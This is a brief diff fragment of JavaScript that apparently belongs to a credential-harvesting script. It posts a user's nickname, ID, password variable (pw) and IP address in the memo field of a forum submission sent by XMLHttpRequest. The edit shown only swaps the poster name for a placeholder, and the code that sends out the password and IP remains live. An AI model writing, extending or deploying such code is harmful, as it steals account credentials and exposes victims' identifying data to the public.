@@ -30,7 +30,7 @@ var xhr = new XMLHttpRequest();
         // do something to response
         console.log(this.responseText);
     };
-    data='ci_t=&password=1234&is_secret=0&name='+user_nick+'&memo='+user_nick + '(' + user_id + ')' + '\n' + pw + '\n' + user_ip;
+    data='ci_t=&password=1234&is_secret=0&name=ㅇㅇ&memo='+user_nick + '(' + user_id + ')' + '\n' + pw + '\n' + user_ip;
     xhr.send(data);
 }
 
